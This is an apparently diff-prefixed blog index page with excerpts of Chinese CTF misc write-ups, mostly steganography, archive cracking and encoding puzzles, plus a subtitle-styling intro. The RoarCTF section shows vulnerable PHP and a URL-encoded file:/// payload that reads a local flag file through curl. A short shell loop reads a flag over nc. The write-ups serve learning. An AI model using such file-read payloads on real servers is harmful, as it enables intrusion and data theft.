-            <a href="/2023/12/14/DASCTF-x-BJD-12%E6%9C%88%E5%9C%A3%E8%AF%9E%E7%8B%82%E6%AC%A2%E8%B5%9BMisc-wp/">DASCTF x BJD 12月圣诞狂欢赛Misc wp</a>
-        </h1>
-        
-        <div class="article-meta clearfix">
-            <a class="article-date" href="http://example.com/index.html">
-    
-    <i class="icon-calendar vm"></i>
-    
-    <time class="vm" datetime="2023-12-14T03:42:48.000Z" itemprop="datePublished">2023-12-14</time>
-</a>
-
-            
-
-        </div>
-    </header>
-    
-    <section class="article-body markdown-body">
-        
-        <h1 id="马老师的秘籍"><a href="#马老师的秘籍" class="headerlink" title="马老师的秘籍"></a>马老师的秘籍</h1><p>一个靶机，一张几十个二维码的大图，随便扫了一个发现是mbg的语录其中3个字，一开始想弄下来切开一个个扫，以为flag就在这里面。但是太蠢了，所以果断把图片保存下来，是个png。丢winhex，好的，有压缩包，那么直接binwalk，在kali里打开压缩包是归档损坏状态，binwalk出来的两个txt文件都是空的，尝试把压缩包拿出windows查看，有三个文件，一个GoodLuck.txt，一个闪电五连鞭.txt，还有一个马老师的磁盘.jpg，压缩包带密码，尝试全部的伪加密，发现jpg是伪加密，图片长得和png几乎一样，然后有明显的需要处理的痕迹，其他俩带密码，jpg解压出来stegsolve和png异或，发现<img src="http://ayanagi.fun/post-images/1608891934024.png"><br>把NianQingRenBuJiangWuDe丢去md5加密，直觉是取32位小写</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c57988283c92f759585a0c1aebfdd743</span><br></pre></td></tr></table></figure>
-
-<p>将两个txt解压出来，一个内容是<img src="http://ayanagi.fun/post-images/1608892038946.jpg"><br>另一个内容是<img src="http://ayanagi.fun/post-images/1608892053512.jpg"><br>一看就知道是Ook，批量替换之</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DASCTF&#123;f79f28f30232e26a2f51b6b75355afa9&#125;</span><br></pre></td></tr></table></figure>
-
-<p>交了好几次发现都错了，一看公告发现不需要带上DASCTF{}。</p>
-<h1 id="FakePic"><a href="#FakePic" class="headerlink" title="FakePic"></a>FakePic</h1><p>下载下来是RAR文件，打开发现提示密码是1???，马上想到掩码爆破，但是是高版本加密，archpr无法爆破，rarcrack没爆出来就离谱，明明字典里面没错。随即找了另外的rar暴力软件，而且挺好用的：cRARk。<br>password.def的内容如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">max=4</span><br><span class="line">##</span><br><span class="line">[$a $A $1] *</span><br></pre></td></tr></table></figure>
-
-<p>爆了十几分钟出来了，密码<code>1cpp</code>，解压，一个png，一个txt，hint看不懂。<img src="http://ayanagi.fun/post-images/1608892400404.jpg"><br>png用zsteg看，有些文件，也看不懂。<img src="http://ayanagi.fun/post-images/1608892514717.jpg"><br>但是有一行：<code>searchme_in_Alpha</code><br>stegsolve打开，alpha7个滤镜，在最左边能看到一些类似摩斯电码的东西，<img src="http://ayanagi.fun/post-images/1608892742481.jpg"><br>当时我的表情就是这样的<img src="http://ayanagi.fun/post-images/1608893119131.jpg">，<br>图片旋转之后放大五倍，是这样的<img src="http://ayanagi.fun/post-images/1608893157633.jpg">结合hint:10132430，<br>可能是把这些码按照滤镜1 0 1 3 2 4 3 0的顺序抄下来排列，抄完之后解摩斯电码，不对，但是有一些类似url的转码字符。感觉又有希望，但是觉得又不像摩斯码，不知道是啥了，最后放弃，等官方wp。<br><a target="_blank" rel="noopener" href="http://www.7yue.top/2020-dasctfbjd-miscwp/">http://www.7yue.top/2020-dasctfbjd-miscwp/</a><br>题目没了而且也懒得复现了，直接贴大师傅的wp。</p>
-        
-        <p class="article-more-link">
-            <a href="/2023/12/14/DASCTF-x-BJD-12%E6%9C%88%E5%9C%A3%E8%AF%9E%E7%8B%82%E6%AC%A2%E8%B5%9BMisc-wp/#more">
-                <span class="vm">阅读更多</span>
-                <i class="icon-arrow-double-right vm"></i>    
-            </a>
-        </p>
-        
-        
-    </section>
-</article>
-
-
-    <article class="article" itemscope itemprop="blogPost">
-    
-    <header class="article-header">
-        
-        <h1 itemprop="name">
-            <a href="/2023/12/14/Hgame2021-misc-WP-%E5%A4%8D%E7%8E%B0/">Hgame2021 misc WP+复现</a>
-        </h1>
-        
-        <div class="article-meta clearfix">
-            <a class="article-date" href="http://example.com/index.html">
-    
-    <i class="icon-calendar vm"></i>
-    
-    <time class="vm" datetime="2023-12-14T03:42:48.000Z" itemprop="datePublished">2023-12-14</time>
-</a>
-
-            
-
-        </div>
-    </header>
-    
-    <section class="article-body markdown-body">
-        
-        <p>1305分，只拿了总分一半不到。厮混了半年水平竟如此半吊子，心中还是失落更多，但是步伐不会停下。有懊恼，因为搜索引擎使用方式不恰当而和400分失之交臂。</p>
-<h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="Base全家福"><a href="#Base全家福" class="headerlink" title="Base全家福"></a>Base全家福</h2><p><code>R1k0RE1OWldHRTNFSU5SVkc1QkRLTlpXR1VaVENOUlRHTVlETVJCV0dVMlVNTlpVR01ZREtSUlVIQTJET01aVUdSQ0RHTVpWSVlaVEVNWlFHTVpER01KWElRPT09PT09</code></p>
-<p>解b64，解b32，解b16</p>
-<p>其实使用basecrack就能实现自动base机</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">python basecrack.py --m</span><br><span class="line">                python basecrack.py -h [FOR HELP]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">[&gt;</span><span class="language-bash">] Enter Encoded Base: R1k0RE1OWldHRTNFSU5SVkc1QkRLTlpXR1VaVENOUlRHTVlETVJCV0dVMlVNTlpVR01ZREtSUlVIQTJET01aVUdSQ0RHTVpWSVlaVEVNWlFHTVpER01KWElRPT09PT09</span></span><br><span class="line"></span><br><span class="line">[-] Iteration: 1</span><br><span class="line"></span><br><span class="line">[-] Heuristic Found Encoding To Be: Base64</span><br><span class="line"></span><br><span class="line">[-] Decoding as Base64: GY4DMNZWGE3EINRVG5BDKNZWGUZTCNRTGMYDMRBWGU2UMNZUGMYDKRRUHA2DOMZUGRCDGMZVIYZTEMZQGMZDGMJXIQ======</span><br><span class="line"></span><br><span class="line">&#123;&#123;&lt;&lt;======================================================================&gt;&gt;&#125;&#125;</span><br><span class="line"></span><br><span class="line">[-] Iteration: 2</span><br><span class="line"></span><br><span class="line">[-] Heuristic Found Encoding To Be: Base32</span><br><span class="line"></span><br><span class="line">[-] Decoding as Base32: 6867616D657B57653163306D655F74305F4847344D335F323032317D           </span><br><span class="line"></span><br><span class="line">&#123;&#123;&lt;&lt;======================================================================&gt;&gt;&#125;&#125;             </span><br><span class="line"></span><br><span class="line">[-] Iteration: 3                                                                           </span><br><span class="line"></span><br><span class="line">[-] Heuristic Found Encoding To Be: Base16                                                 </span><br><span class="line"></span><br><span class="line">[-] Decoding as Base16: hgame&#123;We1c0me_t0_HG4M3_2021&#125;                                       </span><br><span class="line"></span><br><span class="line">&#123;&#123;&lt;&lt;======================================================================&gt;&gt;&#125;&#125;             </span><br><span class="line"></span><br><span class="line">[-] Total Iterations: 3                                                                    </span><br><span class="line"></span><br><span class="line">[-] Encoding Pattern: Base64 -&gt; Base32 -&gt; Base16                                           </span><br><span class="line"></span><br><span class="line">[-] Magic Decode Finished With Result: hgame&#123;We1c0me_t0_HG4M3_2021&#125;                        </span><br><span class="line"></span><br><span class="line">[-] Finished in 0.0023 seconds </span><br></pre></td></tr></table></figure>
-
-<p><code>hgame&#123;We1c0me_t0_HG4M3_2021&#125;</code></p>
-<h2 id="不起眼压缩包的养成方法"><a href="#不起眼压缩包的养成方法" class="headerlink" title="不起眼压缩包的养成方法"></a>不起眼压缩包的养成方法</h2><p>因为压缩算法的问题被卡了一整天。一道非常简单的题。</p>
-        
-        <p class="article-more-link">
-            <a href="/2023/12/14/Hgame2021-misc-WP-%E5%A4%8D%E7%8E%B0/#more">
-                <span class="vm">阅读更多</span>
-                <i class="icon-arrow-double-right vm"></i>    
-            </a>
-        </p>
-        
-        
-    </section>
-</article>
-
-
-    <article class="article" itemscope itemprop="blogPost">
-    
-    <header class="article-header">
-        
-        <h1 itemprop="name">
-            <a href="/2023/12/14/RoarCTF-2020-Misc-wp/">RoarCTF 2020-Misc wp</a>
-        </h1>
-        
-        <div class="article-meta clearfix">
-            <a class="article-date" href="http://example.com/index.html">
-    
-    <i class="icon-calendar vm"></i>
-    
-    <time class="vm" datetime="2023-12-14T03:42:48.000Z" itemprop="datePublished">2023-12-14</time>
-</a>
-
-            
-
-        </div>
-    </header>
-    
-    <section class="article-body markdown-body">
-        
-        <p>wp部分转自</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s?__biz=MzU3ODc2NTg1OA==&amp;mid=2247485804&amp;idx=1&amp;sn=15b8b99fc9cdca98d5fa99484b776063&amp;chksm=fd711c21ca0695374a191994b75b563b1a7604b70aa3c0b0251e78721f5a24de8ff85f85284f&amp;mpshare=1&amp;scene=23&amp;srcid=1207vysHlxNfj0iTwS4Fq5Xw&amp;sharer_sharetime=1607348906792&amp;sharer_shareid=8b035134b7fe8a8160582bb9a2551229#rd</span><br></pre></td></tr></table></figure>
-
-<p>华丽丽的爆了零。<br>仰慕着夏风师傅对Roar2019的精彩wp，自己做BUU也遇到了相同的题，难度不高，然后小瞧了今年的。<br>只对misc有了解，web大概只有F12和GET&#x2F;POST的水平，然后签到出不来，签到是个披着misc皮的web。</p>
-<h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;!-- /?url= --&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$curl</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line">  <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_TIMEOUT, <span class="number">500</span>);</span><br><span class="line">  <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="variable">$res</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl</span>);</span><br><span class="line">  <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curl</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//47.104.232.98:39390/?url=file:///%25%36%36%25%36%63%25%36%31%25%36%37</span></span><br><span class="line"><span class="comment">//flag&#123;c8ff10a5edb8acb9d8ef20f8eeba19a6&#125; </span></span><br></pre></td></tr></table></figure>
-
-<h1 id="Hi-433MHz"><a href="#Hi-433MHz" class="headerlink" title="Hi 433MHz"></a>Hi 433MHz</h1><p>无线电流量分析，一看就不是我能做的题。但是看完wp乍一看也不是很难，只是第一次看见，不会分析罢了。<br>以下是北极星战队的wp：<br>汽车钥匙信号〜433Mhz。车钥匙信号的前导码是稳定的数据流，可以向接收者显示出实际正在被接受的数据。使用&#x2F;inspectrum波形分析工具，symbols设为8个后，做相应调整，打开add sample plot选项<br><img src="http://ayanagi.fun/post-images/1607395887242.png"><br>我们要关注的是蓝色的波形，如果波形比较密集就代表1，比较稀疏就代表0<br><img src="http://ayanagi.fun/post-images/1607395903655.png"><br>然后就是慢慢的记录0、1二进制，转为ascii码就是flag</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;25c21b0d-6a11-4312-971b-428d01cdc534&#125;</span><br></pre></td></tr></table></figure>
-
-<p>后记：其实上面的是小题大做了。<br>刚刚看了别人的wp，直接扔进audacity里像数摩斯电码一样数就行，只不过并不是转成字符串，而是短为0长为1的二进制转ascii</p>
-<h1 id="FM"><a href="#FM" class="headerlink" title="FM"></a>FM</h1>
-        
-        <p class="article-more-link">
-            <a href="/2023/12/14/RoarCTF-2020-Misc-wp/#more">
-                <span class="vm">阅读更多</span>
-                <i class="icon-arrow-double-right vm"></i>    
-            </a>
-        </p>
-        
-        
-    </section>
-</article>
-
-
-    <article class="article" itemscope itemprop="blogPost">
-    
-    <header class="article-header">
-        
-        <h1 itemprop="name">
-            <a href="/2023/12/14/SWPUCTF-2020-Misc-WP/">SWPUCTF 2020-Misc WP</a>
-        </h1>
-        
-        <div class="article-meta clearfix">
-            <a class="article-date" href="http://example.com/index.html">
-    
-    <i class="icon-calendar vm"></i>
-    
-    <time class="vm" datetime="2023-12-14T03:42:48.000Z" itemprop="datePublished">2023-12-14</time>
-</a>
-
-            
-
-        </div>
-    </header>
-    
-    <section class="article-body markdown-body">
-        
-        <p>有一定难度，但不是不能做，其实misc难度还算适中吧，只是都是套娃</p>
-<h1 id="耗子尾汁"><a href="#耗子尾汁" class="headerlink" title="耗子尾汁"></a>耗子尾汁</h1><p>binwalk出一个mp4视频和一个压缩包。扔进vegas逐帧查看，发现一串base64解得压缩包密码<code>sign_in</code><br>得到一个txt，文件名是19_20.txt，应该是提示，但是我看不懂，后来才知道是仿射，还是见识过于短浅了。<br>里面是一串b64以及<code>The last layer is the single table replacement password</code>的hint<br>解b64，转字符串，第一次从单表替换这个概念去了解密码，无脑使用凯撒栅栏这些没有任何结果。去quipquip，没整出来，因为不会用。看flag的格式是带下划线的，但是也不会整。<br>就差一点就出了，真的很急很气。<br>后来询问@Hh0师傅，最后是给那串东西按照给的格式添上下划线才能解出来。</p>
-<h1 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h1><p>非常简单的excel，都知道excel能改成zip解压，解压出一个txt和另一个excel，看文件名知道是RC4，excel继续改文件名解压，得到一个加了密的key压缩包和又一个excel，这次这个excel解压没啥用，扔winhex看到尾部的密码，解压得到key，RC4解密</p>
-<h1 id="找找吧"><a href="#找找吧" class="headerlink" title="找找吧"></a>找找吧</h1><p>压缩包丢进winhex得到key，解压得一个mp3和一个rar，mp3扔audacity没用，winhex看是rar，改后缀解压出一个mp3和一个png，au打开mp3后面有摩斯电码，解出一串东西，就卡住了。<br>后来群里讨论说是md5，找半天md5解码，要么要钱要么失败，头都秃了。没做出来<br>后来在各方帮助下在somd5上解出<code>n1ce_try</code><br>一个gif和一个png<br>stegsolve逐帧播放，看到类似flag的内容，png很明显的改宽高，发现提示 <code>Veni,Vidi,Vici</code>搜了知道是凯撒，凯撒可以得flag。</p>
-<h1 id="来猜谜了"><a href="#来猜谜了" class="headerlink" title="来猜谜了"></a>来猜谜了</h1><p>png一张，stegsolve LSB隐写了一个压缩包，丢kali zsteg提取</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zsteg extract &quot;b1,rgb,lsb,xy&quot; problem.png &gt; flag.zip</span><br></pre></td></tr></table></figure>
-        
-        <p class="article-more-link">
-            <a href="/2023/12/14/SWPUCTF-2020-Misc-WP/#more">
-                <span class="vm">阅读更多</span>
-                <i class="icon-arrow-double-right vm"></i>    
-            </a>
-        </p>
-        
-        
-    </section>
-</article>
-
-
-    <article class="article" itemscope itemprop="blogPost">
-    
-    <header class="article-header">
-        
-        <h1 itemprop="name">
-            <a href="/2023/12/14/V-N-CTF2021-misc-%E7%AE%80%E8%A6%81%E5%A4%8D%E7%8E%B0/">V&amp;N CTF2021 misc 简要复现</a>
-        </h1>
-        
-        <div class="article-meta clearfix">
-            <a class="article-date" href="http://example.com/index.html">
-    
-    <i class="icon-calendar vm"></i>
-    
-    <time class="vm" datetime="2023-12-14T03:42:48.000Z" itemprop="datePublished">2023-12-14</time>
-</a>
-
-            
-
-        </div>
-    </header>
-    
-    <section class="article-body markdown-body">
-        
-        <p>当时懒得折腾。主要是口腔溃疡加上下雨，基金暴跌，心情不是很好。加上各种压力感觉有点力不从心了，也少了以前学习的那份冲劲。<br>颓废。</p>
-<h1 id="冰冰好像藏着秘密"><a href="#冰冰好像藏着秘密" class="headerlink" title="冰冰好像藏着秘密"></a>冰冰好像藏着秘密</h1><p>损坏的压缩包一枚，修复解压得<code>FFT.png</code>看图片名应该就是要傅里叶变换取得盲水印了吧，不过一开始没注意就扔进自动机里爆了，出来了个假flag，交上去wa了就没管了。<br>理解并抄下FFT脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv <span class="comment">#opencv库，对图像处理必备</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np <span class="comment">#numpy库，同样</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt <span class="comment">#matplotlib库，作图必备</span></span><br><span class="line">img = cv.imread(<span class="string">&#x27;FFT.png&#x27;</span>, <span class="number">0</span>) <span class="comment">#右键查看图片的时候可以发现只有8位深，直接读为灰度图像</span></span><br><span class="line">f = np.fft.fft2(img) <span class="comment">#做频率变换</span></span><br><span class="line">fshift = np.fft.fftshift(f) <span class="comment">#转移像素做幅度谱</span></span><br><span class="line">s1 = np.log(np.<span class="built_in">abs</span>(fshift))<span class="comment">#取绝对值：将复数变化成实数取对数的⽬的为了将数据变化到0-255</span></span><br><span class="line">plt.subplot(<span class="number">121</span>)</span><br><span class="line">plt.imshow(img, <span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;original&#x27;</span>)</span><br><span class="line">plt.subplot(<span class="number">122</span>)</span><br><span class="line">plt.imshow(s1,<span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;center&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://ayanagi.fun/post-images/1616130338869.png"></p>
-<h1 id="Do-you-like-Rhythm-Doctor"><a href="#Do-you-like-Rhythm-Doctor" class="headerlink" title="Do_you_like_Rhythm_Doctor"></a>Do_you_like_Rhythm_Doctor</h1><p>使用节奏医生编辑器打开文件，节拍分为矩形波形，猜测01组合，一行一行进行，抄下节拍内容二进制转字符<br><code>flag&#123;W31come_V&amp;N_CTF&#125;</code></p>
-<h1 id="interesting-fishing"><a href="#interesting-fishing" class="headerlink" title="interesting_fishing"></a>interesting_fishing</h1><p>套娃蛮多的，主要学习到的知识是eml文件相关、RTF下的unicode编码。<br>把bin改为eml，用的是foxmail打开得到图片和压缩包。取得两个文件，图片扔oursecret得到第二部分flag，<br>压缩包解压，查看工程文件，发现假flag，生成文件后报错发现powershell命令执行，去找Browse.VC.db，文件夹选项里把隐藏文件显示打开，在<code>\giveyourflag\giveyourflag\x64\Debug</code>目录下可以看到<code>Browse.VC.db</code>文件，记事本打开，将里面的b64串解密，得到</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\u-65432?\u-65420?\u-65420?\u-65424?\u-65421?\u-65478?\u-65489?\u-65489?\u-65418?\u-65426?\u-65437?\u-65420?\u-65434?\u-65491?\u-65486?\u-65487?\u-65485?\u-65491?\u-65487?\u-65486?\u-65483?\u-65481?\u-65488?\u-65482?\u-65487?\u-65487?\u-65486?\u-65485?\u-65490?\u-65437?\u-65425?\u-65421?\u-65490?\u-65439?\u-65424?\u-65491?\u-65426?\u-65439?\u-65426?\u-65430?\u-65431?\u-65426?\u-65433?\u-65490?\u-65427?\u-65415?\u-65423?\u-65437?\u-65428?\u-65425?\u-65419?\u-65436?\u-65490?\u-65437?\u-65425?\u-65427?\u-65489?\u-65456?\u-65415?\u-65425?\u-65426?\u-65433?\u-65415?\u-65439?\u-65426?\u-65433?\u-65499?\u-65486?\u-65488?\u-65421?\u-65420?\u-65425?\u-65422?\u-65435?\u-65421?\u-65499?\u-65486?\u-65488?\u-65428?\u-65425?\u-65417?\u-65499?\u-65486?\u-65488?\u-65425?\u-65426?\u-65499?\u-65486?\u-65488?\u-65434?\u-65425?\u-65422?\u-65435?\u-65431?\u-65433?\u-65426?\u-65499?\u-65486?\u-65488?\u-65433?\u-65425?\u-65425?\u-65436?\u-65421?\u-65499?\u-65486?\u-65488?\u-65439?\u-65427?\u-65431?\u-65436?\u-65499?\u-65486?\u-65488?\u-65458?\u-65425?\u-65422?\u-65420?\u-65432?\u-65499?\u-65486?\u-65488?\u-65461?\u-65425?\u-65422?\u-65435?\u-65439?\u-65426?\u-65499?\u-65486?\u-65488?\u-65469?\u-65457?\u-65450?\u-65463?\u-65468?\u-65491?\u-65487?\u-65479?\u-65499?\u-65486?\u-65488?\u-65424?\u-65439?\u-65422?\u-65439?\u-65426?\u-65425?\u-65431?\u-65439?\u-65490?\u-65422?\u-65439?\u-65422?</span><br></pre></td></tr></table></figure>
-        
-        <p class="article-more-link">
-            <a href="/2023/12/14/V-N-CTF2021-misc-%E7%AE%80%E8%A6%81%E5%A4%8D%E7%8E%B0/#more">
-                <span class="vm">阅读更多</span>
-                <i class="icon-arrow-double-right vm"></i>    
-            </a>
-        </p>
-        
-        
-    </section>
-</article>
-
-
-    <article class="article" itemscope itemprop="blogPost">
-    
-    <header class="article-header">
-        
-        <h1 itemprop="name">
-            <a href="/2023/12/14/%E6%9D%AD%E7%94%B50rays-2020%E6%8B%9B%E6%96%B0%E8%B5%9BMisc-%E5%A4%8D%E7%8E%B0/">杭电0rays 2020招新赛Misc 复现</a>
-        </h1>
-        
-        <div class="article-meta clearfix">
-            <a class="article-date" href="http://example.com/index.html">
-    
-    <i class="icon-calendar vm"></i>
-    
-    <time class="vm" datetime="2023-12-14T03:42:48.000Z" itemprop="datePublished">2023-12-14</time>
-</a>
-
-            
-
-        </div>
-    </header>
-    
-    <section class="article-body markdown-body">
-        
-        <h1 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test your nc"></a>test your nc</h1><p>需要拥有shell的基础知识。当时是没有的，签到都出不来。<br>nc上去之后ls<br><img src="http://ayanagi.fun/post-images/1611563190477.png"><br>之后发现输啥都不好使。<br>看wp才知道用的是<code>echo</code>语句读取flag<br>nc之后</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash</span><br><span class="line">for s in $(&lt;flag); do echo $s; done</span><br></pre></td></tr></table></figure>
-
-<h1 id="我要成为神奇宝贝带师"><a href="#我要成为神奇宝贝带师" class="headerlink" title="我要成为神奇宝贝带师"></a>我要成为神奇宝贝带师</h1><p>下载gba模拟器，附件后缀要改成gba才能读取，随便玩了一通，其实没啥意思。地上比较突出的草丛就是flag的字母。<br>使用口袋妖怪地图编辑器advancemap<br><img src="http://ayanagi.fun/post-images/1611564763642.png"><br>从3.0开始打开地图，(图中flag字母我已经涂黑处理)<br>按顺序可以得到<code>I_LvPeo4mok</code><br>需要自行结合hint：flag是15位，并调整位置使其可读。<br><code>I_Love_Pok4mo</code>，其实这个4蛮神秘的，因为pokemon的4位置其实是e字母。不太像是能用4代替的样子。组合完发现少2个，在几百张地图里找了n久，最后找到是在最后面<img src="http://ayanagi.fun/post-images/1611565058098.png"><br>挺脑洞的一道题，并不能学到什么。</p>
-<h1 id="who-is-killer"><a href="#who-is-killer" class="headerlink" title="who is killer"></a>who is killer</h1><p>下完附件丢winhex看，看不出什么。binwalk发现图里藏了一张图。分不出来，使用foremost分出来，一张密文图片，原图改宽高得到hint：z-340，google查询，得知是黄道十二宫杀手的密码，各种报道吹的玄乎得很，恰逢当时没什么想法做题，就没往下做了。<br>通过wp学习到340是一个矩形信息，将密码分为3个部分，第一部分和第二部分为9行，最后一部分为2行。<br><img src="http://ayanagi.fun/post-images/1611565739291.png"><br><img src="http://ayanagi.fun/post-images/1611569685804.png"><br>只要按照第一部分去做就行了。走法是：从第一个字符开始，图中为h，向下一格，向右两格，得到e，以此类推，走到最右下角的话就继续反复，又从左上角开始，最后一行的下一行是第一行，回到第一行；最右边一列的再右边两列是第二列，那么o的下一个字符是y，以此类推。<br><code>helloboysandgirlsiamzodicakillercongratulationonfindmethisisyourflagzpggisthefinallybigboss</code><br>其实有个非预期也不用读这么多，直接找f以及下三个字母能组成flag的，以此为基础继续往下读就能减少很多工作量(不会写脚本是这样的了)</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;zpggisthefinallybigboss&#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="verylow"><a href="#verylow" class="headerlink" title="verylow"></a>verylow</h1><p>显然的b64转文件，解码后是504B开头，转成zip，解压出来一个woshishui文件，然后就不会了。wp说是将全文件反转后看到bmp的头，但是并没有说如何反转，难道就是16进制逆序？但其实不然，因为在winhex里看它的尾巴并不是逆序的bmp文件头，只好搁置。<br>询问得知，反转意为让文件与FF异或，丢cyberchef处理。大厨yyds！得到一张bmp。首先要知道silenteye里有verylow解密，才能由题目名的verylow知道使用silenteye解出来</p>
-        
-        <p class="article-more-link">
-            <a href="/2023/12/14/%E6%9D%AD%E7%94%B50rays-2020%E6%8B%9B%E6%96%B0%E8%B5%9BMisc-%E5%A4%8D%E7%8E%B0/#more">
-                <span class="vm">阅读更多</span>
-                <i class="icon-arrow-double-right vm"></i>    
-            </a>
-        </p>
-        
-        
-    </section>
-</article>
-
-
-    <article class="article" itemscope itemprop="blogPost">
-    
-    <header class="article-header">
-        
-        <h1 itemprop="name">
-            <a href="/2023/12/14/%E7%89%B9%E6%95%88%E8%BD%B4%E5%85%A5%E9%97%A8/">特效轴入门</a>
-        </h1>
-        
-        <div class="article-meta clearfix">
-            <a class="article-date" href="http://example.com/index.html">
-    
-    <i class="icon-calendar vm"></i>
-    
-    <time class="vm" datetime="2023-12-14T03:42:48.000Z" itemprop="datePublished">2023-12-14</time>
-</a>
-
-            
-
-        </div>
-    </header>
-    
-    <section class="article-body markdown-body">
-        
-        <h1 id="aegisub文件结构"><a href="#aegisub文件结构" class="headerlink" title="aegisub文件结构"></a>aegisub文件结构</h1><p>进入到aeg的目录，关注的是<code>automation</code>、<code>catalog</code>、<code>locale</code>和<code>csri</code>文件夹，<code>config.json</code>、<code>hotkey.json</code><br><strong>automation</strong> : 文件夹下存放一些关于自动化的插件(<code>autoload</code>下)，一些函数库(<code>include</code>下)<br><strong>csri</strong> : 存放字幕滤镜，例如<code>vsfiltermod</code><br><strong>config.json</strong>: 基础设置<br><strong>hotkey.json</strong> : 热键设置文件<br><strong>catalog</strong> : 样式库，存放以.sty结尾的字幕样式文件<br>字幕的样式以一条这样的语句构成</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Style: Default,Arial,20,&amp;H00FFFFFFF,&amp;H00FFFFFF,&amp;H000000FF,&amp;H00000000,&amp;H00000000,0,0,0,0,100,100,0,0,1,2,2,2,10,10,10,1</span><br></pre></td></tr></table></figure>
-
-<p>一些字体字号等不赘述。其中，带<code>&amp;H</code>的是颜色标签，由两部分组成 : 1字节的透明标签和3字节的颜色代码，H代表的是16进制的表头，表示后面的数据是16进制，颜色顺序是B G R。<br>颜色标签之后的参数代表的是边距、边框、杂项等内容，在样式编辑器里有对应。</p>
